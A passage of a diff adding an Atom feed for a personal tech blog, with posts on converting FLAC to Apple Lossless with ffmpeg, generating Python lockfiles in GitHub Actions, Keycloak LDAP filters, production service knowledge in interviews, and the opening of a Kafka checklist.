@@ -1,0 +1,619 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Andrey Krisanov</title>
+    <link href="https://akrisanov.com/atom.xml" rel="self" type="application/atom+xml"/>
+    <link href="https://akrisanov.com"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2023-10-23T00:00:00+00:00</updated>
+    <id>https://akrisanov.com/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Convert Flac to Apple Lossless With FFmpeg</title>
+        <published>2023-10-23T00:00:00+00:00</published>
+        <updated>2023-10-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/convert-flac-to-apple-lossless-with-ffmpeg/" type="text/html"/>
+        <id>https://akrisanov.com/convert-flac-to-apple-lossless-with-ffmpeg/</id>
+        
+        <content type="html">&lt;p&gt;I&#x27;m a longtime Apple Music user. Most of my so-called music collection is on the streaming service.
+However, I occasionally buy rare or remastered releases ripped from CDs. These releases are usually
+in the FLAC format, which Apple Music doesn&#x27;t support. But I&#x27;ve found an easy workaround that
+allows me to organize and play albums on the go.&lt;&#x2F;p&gt;
+&lt;p&gt;The centerpiece of the workaround is FFmpeg. So if you don&#x27;t already have it installed,
+it&#x27;s worth installing now:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;brew&lt;&#x2F;span&gt;&lt;span&gt; install ffmpeg
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;span class=&quot;img-title&quot;&gt;Homebrew Formula&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;When the tool is ready to use, navigate to the folder containing the FLAC files and run the following script:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;for&lt;&#x2F;span&gt;&lt;span&gt; file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;in *&lt;&#x2F;span&gt;&lt;span&gt;.flac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;ffmpeg&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -acodec&lt;&#x2F;span&gt;&lt;span&gt; alac&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; -vcodec&lt;&#x2F;span&gt;&lt;span&gt; copy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;`&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;basename &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot; .flac`.m4a&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; done; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;mkdir&lt;&#x2F;span&gt;&lt;span&gt; flac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;mkdir&lt;&#x2F;span&gt;&lt;span&gt; alac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; for&lt;&#x2F;span&gt;&lt;span&gt; file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;in *&lt;&#x2F;span&gt;&lt;span&gt;.flac&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;mv &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot; &amp;quot;flac&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; done; for&lt;&#x2F;span&gt;&lt;span&gt; file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;in *&lt;&#x2F;span&gt;&lt;span&gt;.m4a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;mv &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot; &amp;quot;alac&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;; done;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;span class=&quot;img-title&quot;&gt;Silly One-liner Converting FLAC to ALAC&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;Screenshot-2023-10-22-at-18.26.25.png&quot; alt=&quot;&quot; &#x2F;&gt;
+&lt;span class=&quot;img-title&quot;&gt;Susumu Hirasawa – Siren [Limited Edition]&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The bash script converts the audio to the Apple Lossless format (&lt;code&gt;*.m4a&lt;&#x2F;code&gt;) and moves the files to the &lt;code&gt;alac&lt;&#x2F;code&gt; directory:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;Screenshot-2023-10-22-at-18.27.10.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Finally, the &lt;code&gt;alac&lt;&#x2F;code&gt; directory can be dragged to Apple Music to import the album and upload its tracks to the cloud.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;Screenshot-2023-10-22-at-18.27.41.png&quot; alt=&quot;&quot; &#x2F;&gt;
+&lt;span class=&quot;img-title&quot;&gt;The Uploaded Album&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;div class=&quot;callout callout-warning&quot;&gt;
+You probably wonder why this album has no Lossless icon in Apple Music. Well, it turns out the
+audio quality of the FLAC files wasn&#x27;t on pair with lossless. So, make sure releases you buy or
+rip, have a proper audio codec and quality.
+&lt;&#x2F;div&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Generating A Lockfile For Python Project Using Github Actions</title>
+        <published>2023-10-12T00:00:00+00:00</published>
+        <updated>2023-10-12T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/using-github-actions-to-generate-a-lockfile-for-python-project/" type="text/html"/>
+        <id>https://akrisanov.com/using-github-actions-to-generate-a-lockfile-for-python-project/</id>
+        
+        <content type="html">&lt;p&gt;If you&#x27;re working on a project that needs to be packaged for a specific environment other than your
+machine, the CI&#x2F;CD server is your best friend. Products like Github Actions can save you time and
+the hassle of building dependencies you won&#x27;t use in development.&lt;&#x2F;p&gt;
+&lt;p&gt;For example, many developers love Mac computers, especially the ones that come with Apple silicon.
+The sad truth is that we rarely deploy our code on servers with these processors and MacOS.
+Most of the time, projects run on Linux. Unfortunately, Python can&#x27;t guarantee a deterministic
+or reproducible environment.&lt;&#x2F;p&gt;
+&lt;p&gt;Running the command to create a list of all the dependencies that your package will need gives
+a different result on MacOS, Linux, Windows, and so on:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#a4a0e8;&quot;&gt;pip-compile&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#a4a0e8;&quot;&gt; --allow-unsafe --generate-hashes --no-emit-index-url --output-file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;requirements-lock.txt &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; requirements-lock.txt
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;span class=&quot;img-title&quot;&gt;Using pip-tools to compile a requirements.txt file from your dependencies&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Not all dependencies have universal wheels. Moreover, users can install different Python versions.&lt;&#x2F;p&gt;
+&lt;p&gt;Now that you see the problem, let&#x27;s take a quick look at possible solutions.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;yaml&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-yaml &quot;&gt;&lt;code class=&quot;language-yaml&quot; data-lang=&quot;yaml&quot;&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;Build requirements-lock.txt
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;on&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;workflow_dispatch&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;jobs&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;build-requirements-lock&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;runs-on&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;ubuntu-22.04
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;steps&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;      - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;uses&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;actions&#x2F;checkout@v3
+&lt;&#x2F;span&gt;&lt;span&gt;      - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;Set up Python 3.9
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;uses&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;actions&#x2F;setup-python@v3
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;with&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;python-version&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;&amp;quot;3.9&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;      - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;Install pip and pip-tools
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;|
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;          pip install --upgrade pip
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;          pip install --upgrade pip-tools
+&lt;&#x2F;span&gt;&lt;span&gt;      - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;Run pip-compile
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;|
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;          pip-compile --allow-unsafe --generate-hashes --no-emit-index-url --output-file=requirements-lock.txt &amp;gt; requirements-lock.txt
+&lt;&#x2F;span&gt;&lt;span&gt;      - &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;Upload requirements-lock artifact
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;uses&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;actions&#x2F;upload-artifact@v3.1.1
+&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;with&lt;&#x2F;span&gt;&lt;span&gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;requirements-lock
+&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;path&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#cccccc;&quot;&gt;requirements-lock.txt
+&lt;&#x2F;span&gt;&lt;span&gt;          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;retention-days&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;3
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;span class=&quot;img-title&quot;&gt;build-requirements-lock-workflow&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The Github Actions manifest above defines a workflow that can be triggered manually
+on any branch you like.&lt;&#x2F;p&gt;
+&lt;p&gt;Suppose you&#x27;re upgrading some dependencies in requirement.txt. &lt;code&gt;pip install -r requirements.txt&lt;&#x2F;code&gt;
+works fine. Now you want to generate a new lock file for the users. You commit the changes to your
+branch, wait for the tests to pass, and trigger the workflow:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;images&#x2F;gh-actions-lockfile.png&quot; alt=&quot;&quot; &#x2F;&gt;
+&lt;span class=&quot;img-title&quot;&gt;Github Actions Workflow&lt;&#x2F;span&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;A freshly generated requirements-lock.txt appears in downloadable artifacts.
+You download the file and add it to the repo.&lt;&#x2F;p&gt;
+&lt;p&gt;Another option might be to run a similar workflow in a Docker container. I posted a note about
+multi-architecture builds a few months ago. &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;dev.to&#x2F;akrisanov&#x2F;building-multi-arch-images-for-arm-and-x86-2802&quot;&gt;Take a look!&lt;&#x2F;a&gt;
+Just make sure you choose the same architecture and Python version that you want to distribute your project to.&lt;&#x2F;p&gt;
+&lt;div class=&quot;callout callout-bdc&quot;&gt;
+Other tools like Poetry might do the job better and provide more convenient ways of managing lock files.
+But if you have reasons to not use them, it&#x27;s totally fine to stick with good old pip.
+&lt;&#x2F;div&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Synchronizing Users From LDAP With Keycloak Using AD Filters</title>
+        <published>2023-09-23T00:00:00+00:00</published>
+        <updated>2023-09-23T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/custom-user-ldap-filter-in-keycloak/" type="text/html"/>
+        <id>https://akrisanov.com/custom-user-ldap-filter-in-keycloak/</id>
+        
+        <content type="html">&lt;p&gt;One of the ways to synchronize users via a third-party provider with Keycloak is a mechanism
+called User Federation. It allows, using Kerberos or LDAP protocol, to pull user entries from your
+corporate authentication storage. However, if your organization is big enough to have a complex
+structure and there are a lot of users in the user directory, it could be challenging to get only
+a subset of the accounts that belong to different organization units.&lt;&#x2F;p&gt;
+&lt;p&gt;For example, Active Directory models a tree-based structure using the following entities:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;CN&lt;&#x2F;code&gt; = Common Name&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;OU&lt;&#x2F;code&gt; = Organizational Unit&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;DC&lt;&#x2F;code&gt; = Domain Component&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;All the distinguished names can be found in &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;desktop&#x2F;ldap&#x2F;distinguished-names&quot;&gt;the official documentation&lt;&#x2F;a&gt;
+provided by Microsoft.&lt;&#x2F;p&gt;
+&lt;p&gt;To configure a new User Federation in Keycloak, it&#x27;s required to specify a User DN.
+This distinguished name is the base object in the directory information tree where the search
+begins forming candidates for pulling authentication entries. Therefore, we need to know how to
+construct the User DN.&lt;&#x2F;p&gt;
+&lt;p&gt;The base option that an Active Directory administrator could use to create user accounts is to
+organize them under organizational units:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cfg&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-cfg &quot;&gt;&lt;code class=&quot;language-cfg&quot; data-lang=&quot;cfg&quot;&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;OU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;DC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Orgname&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;DC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;ru
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Even if your organizational unit has a complex structure, it&#x27;s still relatively easy for Keycloak
+to find user entries inside it – just activate the &lt;code&gt;Search Scope: Subtree&lt;&#x2F;code&gt; setting when configuring
+the user federation. In large organizations, the Active Directory structure can get quite messy.
+Instead of using clear distinguished names, administrators do something surprising even to them.
+How about putting entries under CN in different organizational units?&lt;&#x2F;p&gt;
+&lt;p&gt;This is what I encountered while working on corporate user authentication for a media platform&#x27;s CMS.
+User entries of the editors were grouped via the Common Name. So, there is no way to define User DN
+in the way I&#x27;ve mentioned in the example above. Fortunately, the LDAP connection allows providing
+a filter for Active Directory. In my case, writing the filter to select all of the members of the
+&lt;code&gt;CMS_EDITOR&lt;&#x2F;code&gt; group was enough to solve a problem:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cfg&quot; style=&quot;background-color:#3b224c;color:#dbbfef;&quot; class=&quot;language-cfg &quot;&gt;&lt;code class=&quot;language-cfg&quot; data-lang=&quot;cfg&quot;&gt;&lt;span&gt;(&amp;amp;(objectCategory&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Person)(sAMAccountName&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=*&lt;&#x2F;span&gt;&lt;span&gt;)(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;|&lt;&#x2F;span&gt;&lt;span&gt;(memberOf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;CN&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;CMS_EDITOR&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;OU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Security&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;OU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Groups&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;OU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Central&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;OU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;DC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;Orgname&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#efba5d;&quot;&gt;DC&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eccdbb;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;ru)))
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Moreover, the &lt;code&gt;Custom User LDAP Filter&lt;&#x2F;code&gt; setting in Keycloak supports logical operators like &lt;em&gt;or&lt;&#x2F;em&gt;
+with &lt;code&gt;|&lt;&#x2F;code&gt;, and I could use it for finding not only the members of the editor staff but also
+CMS admins, guests, etc.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Understand How Services Are Run And Operate In Production</title>
+        <published>2023-09-06T00:00:00+00:00</published>
+        <updated>2023-09-06T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/understand-how-services-are-run-and-operate-in-production/" type="text/html"/>
+        <id>https://akrisanov.com/understand-how-services-are-run-and-operate-in-production/</id>
+        
+        <content type="html">&lt;p&gt;Over the past few years, I&#x27;ve been interviewing dozens of software engineers who didn&#x27;t know how
+their developed services run and operate in production. The reason for that is a rising trend in
+software engineering trusting in an infrastructure team, the magic of the cloud, Docker,
+Kubernetes, and whatnot.&lt;&#x2F;p&gt;
+&lt;p&gt;A conversation with a talent usually looks the following:&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+– How do you ship your service to production?
+&lt;p&gt;– We build Docker images and run containers.&lt;&#x2F;p&gt;
+&lt;p&gt;– Sounds cool! Can you tell me about the resource requirements for a container?&lt;&#x2F;p&gt;
+&lt;p&gt;– Hmm, to be honest, I don&#x27;t know the details. DevOps folks take care of that.&lt;&#x2F;p&gt;
+&lt;p&gt;– (discussing Python app) OK. And what application server do you use?&lt;&#x2F;p&gt;
+&lt;p&gt;– Application Server? (Some people even reply: &amp;quot;You mean WSGI?&amp;quot;)&lt;&#x2F;p&gt;
+&lt;p&gt;– Yes, the thing that handles web requests and runs your Python code.&lt;&#x2F;p&gt;
+&lt;p&gt;– Hmm, let me open a project repo and check..&lt;&#x2F;p&gt;
+&lt;p&gt;– It&#x27;s...Gunicorn!&lt;&#x2F;p&gt;
+&lt;p&gt;– Great. Can you estimate how many requests the web application can handle?&lt;&#x2F;p&gt;
+&lt;p&gt;– I don&#x27;t think so because we don&#x27;t do load testing.&lt;&#x2F;p&gt;
+&lt;p&gt;– So, it&#x27;s not possible to do even a rough estimation?&lt;&#x2F;p&gt;
+&lt;p&gt;– Nope.&lt;&#x2F;p&gt;
+&lt;p&gt;– OK. Do you understand what happens on a processes and threads level when the application server processes a request?&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;p&gt;This is where the conversation hits a dead end. Many talents don&#x27;t. And this is a red sign to me.
+It gets worse when a candidate claims they have experience with (semi)async services in production
+but can&#x27;t explain &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;docs.gunicorn.org&#x2F;en&#x2F;stable&#x2F;design.html?ref=akrisanov.com#server-model&quot;&gt;a service model&lt;&#x2F;a&gt;
+they have chosen and how the services operate because of that (including resources allocating and consumption).&lt;&#x2F;p&gt;
+&lt;p&gt;You might say: &amp;quot;Why do I need to know all that low-level stuff in the 2020s?&amp;quot;.
+Fair enough...if you don&#x27;t develop software for thousands of users, have an unlimited budget for
+underutilized hardware, don&#x27;t design distributed systems, or, simply, have an SRE team ready to
+solve all possible issues for you. Otherwise, please do.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Choosing Apache Kafka For A New Project – A Questionnaire</title>
+        <published>2023-08-29T00:00:00+00:00</published>
+        <updated>2023-08-29T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://akrisanov.com/choosing-kafka/" type="text/html"/>
+        <id>https://akrisanov.com/choosing-kafka/</id>
+        
+        <content type="html">&lt;p&gt;In any modern project where there is a need to process events – a set of messages or a stream of
+data – developers often propose Apache Kafka as the infrastructure solution. This is not always a
+weighted choice – where a classic broker like ActiveMQ will do, marketing sometimes prevails.&lt;&#x2F;p&gt;
+&lt;p&gt;But let&#x27;s assume that you have deliberately chosen Kafka, or that the infrastructure team has
+left you no alternative. Before setting up broker parameters and writing producers and consumers,
+what questions should you ask yourself? To ensure a smooth start, I have prepared the following
+checklist:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;The amount of data that is going to be generated by the producers →
+Will &lt;strong&gt;the network channel&lt;&#x2F;strong&gt; be sufficient for the entire system and its critical components?
